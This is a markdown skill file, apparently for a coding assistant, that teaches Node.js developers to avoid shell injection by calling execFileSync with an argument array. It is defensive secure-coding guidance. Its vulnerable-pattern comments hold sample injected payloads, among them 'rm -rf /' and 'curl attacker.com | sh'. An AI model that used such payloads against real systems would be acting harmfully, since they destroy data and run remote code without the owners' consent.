---
type: skill
lifecycle: stable
inheritance: inheritable
name: shell-injection-prevention
description: Use execFileSync with args array instead of execSync with string concatenation to prevent shell injection
tier: standard
applyTo: '**/*shell*,**/*injection*,**/*prevention*'
currency: 2026-04-30
lastReviewed: 2026-04-30
---

# Shell Injection Prevention

**Category**: Security
**Time Saved**: 1+ hour debugging, prevents incidents
**Battle-tested**: Yes — multiple projects

---

## The Problem

Your Node.js script needs to run external commands (git, npm, az cli). You use `execSync("git status")` and it works. Then someone passes a filename with a semicolon and your server runs arbitrary commands.

## Why It Happens

`execSync(command)` passes the string to a shell (`/bin/sh` or `cmd.exe`), which interprets metacharacters like `;`, `|`, `$()`, and backticks as command separators or substitutions.

## The Rule

**Use `execFileSync(executable, argsArray)` instead of `execSync(string)`**

```javascript
// ❌ DANGEROUS — shell interprets metacharacters
const output = execSync(`git log --oneline ${filename}`);

// ✅ SAFE — no shell, args passed directly to executable
const output = execFileSync('git', ['log', '--oneline', filename]);
```

## When Each Is Appropriate

| Use Case | Method | Why |
|----------|--------|-----|
| Known executable + args | `execFileSync` | No shell, no injection |
| Need shell features (pipes, globs) | `execSync` with allowlist | Validate all inputs |
| User-provided command | **Never** | Don't execute user commands |

## Implementation Patterns

### Basic Safe Pattern

```javascript
const { execFileSync } = require('child_process');

function gitStatus(repoPath) {
  return execFileSync('git', ['status', '--porcelain'], {
    cwd: repoPath,
    encoding: 'utf8',
  });
}
```

### When You Need Shell Features

```javascript
// If you MUST use shell features, validate inputs strictly
const ALLOWED_BRANCHES = ['main', 'develop', 'staging'];

function gitCheckout(branch) {
  if (!ALLOWED_BRANCHES.includes(branch)) {
    throw new Error(`Invalid branch: ${branch}`);
  }
  // Safe because branch is from allowlist
  return execSync(`git checkout ${branch}`, { encoding: 'utf8' });
}
```

### Async Equivalent

```javascript
const { execFile } = require('child_process');
const { promisify } = require('util');
const execFileAsync = promisify(execFile);

async function runGit(args) {
  const { stdout } = await execFileAsync('git', args);
  return stdout;
}
```

## Dangerous Metacharacters

| Shell | Dangerous Characters |
|-------|---------------------|
| Bash | `; | & $ \` ( ) { } < > \n` |
| cmd.exe | `& | < > ^ %` |
| PowerShell | `; | & $ ( ) { } @` |

## Common Vulnerable Patterns

```javascript
// ❌ Filename injection
execSync(`cat ${userProvidedFilename}`);  // file; rm -rf /

// ❌ Argument injection  
execSync(`git clone ${userUrl}`);  // url; curl attacker.com | sh

// ❌ Template literal concatenation
execSync(`npm install ${packageName}`);  // pkg; malicious-command
```

## Verification Checklist

- [ ] All `execSync` calls reviewed for user input
- [ ] User-controlled values use `execFileSync`
- [ ] Shell features avoided or inputs allowlisted
- [ ] No string concatenation with user data in commands
- [ ] Test with `; echo pwned` payload

## Bonus: Slightly Faster

`execFileSync` is marginally faster because it doesn't spawn a shell process. For scripts running many commands, this adds up.

## Related Skills

- `allowlist-over-blocklist` — Input validation
- `path-traversal-prevention` — File path safety
